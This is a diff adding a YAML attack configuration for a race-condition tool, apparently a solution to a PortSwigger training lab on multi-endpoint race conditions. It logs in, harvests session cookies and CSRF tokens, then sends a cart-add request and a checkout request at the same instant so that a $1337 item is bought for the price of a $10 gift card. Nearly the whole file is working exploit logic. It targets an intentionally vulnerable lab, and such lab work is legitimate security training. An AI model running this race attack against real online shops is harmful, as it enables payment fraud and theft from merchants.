@@ -1,0 +1,294 @@
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+# Multi-Endpoint Race Condition - Thread Groups Version
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+#
+# PortSwigger Lab: Multi-endpoint race conditions
+# https://portswigger.net/web-security/race-conditions/lab-race-conditions-multi-endpoint
+#
+# Exploits TOCTOU race between adding item to cart and checkout validation.
+# Thread groups provide cleaner syntax compared to input distribution mode.
+#
+# Setup:
+#   export LAB_HOST="0a1b2c3d.web-security-academy.net"
+#   treco attack.yaml
+#
+# Improvement: Thread groups eliminate redundant input lists and provide
+# clearer intent with named groups (add_jacket vs checkout).
+#
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+metadata:
+  name: "Multi-Endpoint Race Condition (Thread Groups)"
+  version: "2.0"
+  author: "TRECO Team"
+  vulnerability: "CWE-367: Time-of-check Time-of-use (TOCTOU)"
+  description: |
+    Exploits race condition between cart modification and checkout validation
+    using thread groups for cleaner, more maintainable configuration.
+
+target:
+  host: "{{ env('LAB_HOST') }}"
+  port: 443
+  http:
+    follow_redirects: false
+  tls:
+    enabled: true
+    verify_cert: false
+  # proxy:
+  #   type: http
+  #   host: 127.0.0.1
+  #   port: 8080
+
+entrypoint:
+  state: login
+  input:
+    username: "wiener"
+    password: "peter"
+    gift_card_id: "2"      # $10 gift card
+    jacket_id: "1"         # $1337 Lightweight L33t Leather Jacket
+
+states:
+  # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  # Stage 1: Login
+  # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  login:
+    description: "Authenticate as wiener"
+    
+    request: |
+      GET /login HTTP/1.1
+      Host: {{ target.host }}
+      User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36
+      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+    
+    extract:
+      csrf_token:
+        type: xpath
+        pattern: '//input[@name="csrf"]/@value'
+      
+      session:
+        type: cookie
+        pattern: session
+    
+    logger:
+      on_state_leave: |
+        🔐 Session: {{ login.session[:30] }}...
+        🎫 CSRF: {{ login.csrf_token[:16] }}...
+    
+    next:
+      - on_status: 200
+        goto: do_login
+
+  # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  # Stage 2: Submit Login
+  # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  do_login:
+    description: "Submit credentials"
+    
+    request: |
+      POST /login HTTP/1.1
+      Host: {{ target.host }}
+      Cookie: session={{ login.session }}
+      Content-Type: application/x-www-form-urlencoded
+      
+      csrf={{ login.csrf_token }}&username={{ username }}&password={{ password }}
+    
+    extract:
+      session:
+        type: cookie
+        pattern: session
+    
+    logger:
+      on_state_leave: |
+        ✅ Logged in as {{ username }}
+        🍪 Authenticated session: {{ do_login.session[:30] }}...
+    
+    next:
+      - on_status: 302
+        goto: add_gift_card
+
+  # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  # Stage 3: Add Gift Card to Cart
+  # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  add_gift_card:
+    description: "Add $10 gift card to cart"
+    
+    request: |
+      POST /cart HTTP/1.1
+      Host: {{ target.host }}
+      Cookie: session={{ do_login.session }}
+      Content-Type: application/x-www-form-urlencoded
+      
+      productId={{ gift_card_id }}&redir=PRODUCT&quantity=1
+    
+    logger:
+      on_state_leave: |
+        🎁 Added $10 gift card to cart
+    
+    next:
+      - on_status: [200, 302]
+        goto: get_cart_csrf
+
+  # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  # Stage 4: Get CSRF for Checkout
+  # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  get_cart_csrf:
+    description: "Extract CSRF token from cart page"
+    
+    request: |
+      GET /cart HTTP/1.1
+      Host: {{ target.host }}
+      Cookie: session={{ do_login.session }}
+    
+    extract:
+      csrf_checkout:
+        type: xpath
+        pattern: '//input[@name="csrf"]/@value'
+    
+    logger:
+      on_state_leave: |
+        🎫 Checkout CSRF: {{ get_cart_csrf.csrf_checkout[:16] }}...
+        🎯 Ready to race: Add jacket + Checkout simultaneously
+    
+    next:
+      - on_status: 200
+        goto: race_multi_endpoint
+
+  # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  # Stage 5: RACE ATTACK - Thread Groups (IMPROVED!)
+  # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  race_multi_endpoint:
+    description: "Race: Add jacket to cart while checking out"
+    
+    # Empty request - each group has its own
+    request: ""
+    
+    race:
+      sync_mechanism: barrier
+      connection_strategy: multiplexed
+      thread_propagation: single
+      
+      thread_groups:
+        # Group 1: Add expensive jacket to cart
+        - name: add_jacket
+          threads: 1
+          delay_ms: 0  # Execute immediately
+          
+          request: |
+            POST /cart HTTP/1.1
+            Host: {{ target.host }}
+            Cookie: session={{ do_login.session }}
+            Content-Type: application/x-www-form-urlencoded
+            
+            productId={{ jacket_id }}&redir=PRODUCT&quantity=1
+          
+          variables:
+            action: "Add $1337 jacket"
+            endpoint: "/cart"
+        
+        # Group 2: Process checkout with original price
+        - name: checkout
+          threads: 1
+          delay_ms: 0  # Execute simultaneously
+          
+          request: |
+            POST /cart/checkout HTTP/1.1
+            Host: {{ target.host }}
+            Cookie: session={{ do_login.session }}
+            Content-Type: application/x-www-form-urlencoded
+            
+            csrf={{ get_cart_csrf.csrf_checkout }}
+          
+          variables:
+            action: "Process $10 checkout"
+            endpoint: "/cart/checkout"
+    
+    logger:
+      on_state_enter: |
+        
+        ╔══════════════════════════════════════════════════════════════════════════════╗
+        ║  ⚡ Multi-Endpoint Race Attack (Thread Groups)                               ║
+        ╠══════════════════════════════════════════════════════════════════════════════╣
+        ║  Target:    {{ "%-63s" | format(target.host)                              }} ║
+        ║  Strategy:  TOCTOU between cart modification and checkout                    ║
+        ║  Groups:    2 (add_jacket + checkout)                                        ║
+        ╚══════════════════════════════════════════════════════════════════════════════╝
+        
+        🎯 Attack Flow:
+           Group 1 (add_jacket):  POST /cart (add $1337 jacket)
+           Group 2 (checkout):    POST /cart/checkout (process $10 payment)
+        
+        ⏳ Starting simultaneous race...
+      
+      on_thread_enter: |
+        🚀 [{{ group.name }}] {{ group.variables.action }}
+      
+      on_thread_leave: |
+        {% if response.status_code in [200, 302] %}
+        ✅ [{{ group.name }}] {{ group.variables.action }} - Success ({{ "%.2f" | format(timing_ms) }}ms)
+        {% else %}
+        ❌ [{{ group.name }}] {{ group.variables.action }} - Failed (HTTP {{ response.status_code }})
+        {% endif %}
+      
+      on_state_leave: |
+        
+        ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+        🎯 Multi-Endpoint Race Complete!
+        ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+        
+        📊 Results:
+        {% for result in race_multi_endpoint %}
+        {% if result.status in [200, 302] %}
+           ✓ {{ result.group.name }}: HTTP {{ result.status }} ({{ "%.2f" | format(result.timing_ms) }}ms)
+        {% endif %}
+        {% endfor %}
+        
+        💡 If successful:
+           • Jacket added during payment validation window
+           • Checkout processed with original $10 price
+           • Purchased $1337 jacket for $10! 🎉
+        
+        🌐 Next Steps:
+        
+        1. Check order history:
+           Visit: https://{{ target.host }}/my-account
+        
+        2. If jacket is in order history:
+           → Lab solved! 🏆
+        
+        3. If not successful:
+           → Run attack again (timing variance is normal)
+        
+        ⏱️  Timing Analysis:
+           • Both requests completed within {{ "%.2f" | format((race_multi_endpoint | map(attribute='timing_ms') | max) - (race_multi_endpoint | map(attribute='timing_ms') | min)) }}ms window
+           • TOCTOU window: Checkout validation BEFORE cart lock
+           • Exploit: Add jacket DURING validation ⚡
+    
+    next:
+      - on_status: [200, 302]
+        goto: verify_purchase
+
+  # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  # Stage 6: Verify Purchase
+  # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  verify_purchase:
+    description: "Check if jacket was purchased"
+    
+    request: |
+      GET /my-account HTTP/1.1
+      Host: {{ target.host }}
+      Cookie: session={{ do_login.session }}
+    
+    logger:
+      on_state_leave: |
+        
+        ╔══════════════════════════════════════════════════════════════════════════════╗
+        ║  🏁 Attack Complete                                                          ║
+        ╠══════════════════════════════════════════════════════════════════════════════╣
+        ║  Check "Order History" to see if $1337 jacket was purchased for $10         ║
+        ║  If successful, the lab will be marked as solved!                           ║
+        ╚══════════════════════════════════════════════════════════════════════════════╝
+        
+        {% if "Order History" in response.text %}
+        ✅ Order history accessible
+        💰 Check if "Lightweight L33t Leather Jacket" appears in orders
+        {% endif %}
